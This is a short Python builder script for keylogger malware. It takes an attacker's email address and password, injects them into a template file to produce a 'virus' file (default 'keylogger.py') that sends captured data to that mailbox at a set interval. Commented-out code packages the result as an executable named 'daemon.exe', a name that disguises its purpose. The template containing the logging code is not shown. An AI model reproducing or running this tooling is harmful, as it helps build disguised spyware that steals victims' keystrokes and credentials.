import sys, os, subprocess
import argparse
import platform

parser = argparse.ArgumentParser()

parser.add_argument('-e', '--email', required=True, action='store', help='Your email to send data')
parser.add_argument('-p', '--passwd', required=True, action='store', help='Password to email')
parser.add_argument('-pa', '--path', default='keylogger.py', action='store', help='Virus file name')
parser.add_argument('-c', '--count', default='100', action='store', help='???')
parser.add_argument('-d', '--description', default='100', action='store', help='???')
parser.add_argument('-n', '--name', default='100', action='store', help='???')

(email, password, path, count) = (parser.parse_args().email, parser.parse_args().passwd, parser.parse_args().path, parser.parse_args().count)

counter = 0
with open('template.py', 'r') as template:
	with open(path, 'w') as vir:
		for line in template.readlines():
			counter += 1
			if counter == 44:
				vir.write(f'	s = Sender("{email}", "{password}")\n')
			elif counter == 69:
				vir.write(f'		if COUNT_OF % {count} == 0: #flag\n')
			else:
				vir.write(line)

# setup_py = f"from cx_Freeze import setup, Executable \n\
# \n\
# setup(\n\
#     name = '{parser.parse_args().name}',\n\
#     version = '1.0',\n\
#     description = '{parser.parse_args().description}',\n\
#     executables = [Executable('{path}', targetName='daemon.exe')]\n\
# )\n\
# "
# with open('setup.py', 'w') as setup:
# 	setup.writelines(setup_py)

# if platform.system() != 'Linux':
# 	pass
# else:
# 	subprocess.run(['python3','setup.py','build'])
